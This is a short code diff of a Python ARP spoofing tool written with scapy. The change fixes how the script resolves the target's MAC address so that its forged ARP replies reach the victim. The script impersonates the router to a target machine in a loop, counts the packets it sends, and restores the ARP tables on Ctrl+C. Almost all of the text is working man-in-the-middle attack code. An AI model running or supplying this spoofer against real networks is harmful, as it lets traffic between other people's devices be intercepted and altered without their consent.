@@ -1,5 +1,5 @@
 #/usr/bin/env python
-from scapy.layers.l2 import ARP, get_if_hwaddr, Ether
+from scapy.layers.l2 import ARP, getmacbyip, Ether
 import scapy.all as scapy
 import time
 import sys
@@ -9,7 +9,7 @@ from utils.data import data
 check_port_forwarding()
 
 def spoof(target_ip, router_ip):
-    target_mac = get_if_hwaddr("eth0")
+    target_mac = getmacbyip(target_ip)
     packet = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
     # make sure the Ether dst matches the hwdst
     eth_packet = Ether(dst=target_mac) / packet
@@ -33,6 +33,7 @@ try:
         print("\r[+] Packets sent: " + str(sent_packets_count)),
         sys.stdout.flush()
         time.sleep(2)
+
 except KeyboardInterrupt:
     print("\n[+] Detected CTRL + C ...... Quiting.")
     restore(data["target_ip1"], data["router_ip"])
